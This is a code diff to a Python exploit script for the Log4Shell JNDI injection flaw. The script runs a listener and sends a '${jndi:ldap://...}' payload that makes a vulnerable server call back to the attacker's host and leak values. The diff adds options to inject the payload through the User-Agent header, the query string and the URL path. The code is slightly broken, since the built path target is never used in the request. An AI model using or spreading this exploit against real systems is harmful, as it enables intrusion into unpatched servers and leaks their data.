@@ -9,6 +9,7 @@ import argparse
 import socketserver
 import threading
 import time
+from urllib.parse import urljoin
 
 import requests
 
@@ -54,10 +55,18 @@ def main():
                         help='value to leak. '
                              'see: https://twitter.com/Rayhan0x01/status/1469571563674505217 '
                              '(default: ${java:version})')
+    parser.add_argument('--dump-resp', action='store_true', help='dump the http response body')
+    # payload types
+    parser.add_argument('--payload-all', '-pa', action='store_true', help='use the payload everywhere')
+    parser.add_argument('--payload-header', '-ph', action='store_true', default=True,
+                        help='use the payload as the user-agent header')
+    parser.add_argument('--payload-query-string', '-pq', action='store_true',
+                        help='use the payload as query string param')
+    parser.add_argument('--payload-path', '-pp', action='store_true', help='use the payload as parth of the path')
     args = parser.parse_args()
 
     print(f' i| starting server on {args.listen_host}:{args.listen_port}')
-    server = ThreadedTCPServer((args.listen_host, args.listen_port), ThreadedTCPRequestHandler)
+    server = ThreadedTCPServer((args.listen_host, int(args.listen_port)), ThreadedTCPRequestHandler)
 
     serv_thread = threading.Thread(target=server.serve_forever)
     serv_thread.daemon = True
@@ -66,12 +75,34 @@ def main():
     print(f' i| server started')
 
     payload = f'${{jndi:ldap://{args.exploit_host}:{args.listen_port}/{args.leak}}}'
-    print(f' i| sending exploit payload {payload} to {args.target}')
+
+    # prepare the request
+    headers = {}
+    params = {}
+    target = args.target if args.target.endswith('/') else args.target + '/'
+
+    # add payloads based on flags
+    if args.payload_all or args.payload_header:
+        print(f' i| setting payload in User-Agent header')
+        headers['User-Agent'] = payload
+
+    if args.payload_all or args.payload_query_string:
+        print(f' i| setting payload as query string \'q\'')
+        params['q'] = payload
+
+    if args.payload_all or args.payload_path:
+        print(f' i| setting payload as part of the uri path')
+        target = urljoin(target, payload)
+
+    # fire ze lazor
+    print(f' i| sending exploit payload {payload} to {target}')
 
     try:
-        r = requests.get(args.target, headers={'User-Agent': payload})
+        r = requests.get(args.target, headers=headers, params=params)
+        print(f' i| request url was: {r.url}')
         print(f' i| response status code: {r.status_code}')
-        print(f' i| response: {r.text}')
+        if args.dump_resp:
+            print(f' i| response: {r.text}')
     except Exception as e:
         print(f' e| failed to make request: {e}')
     finally:
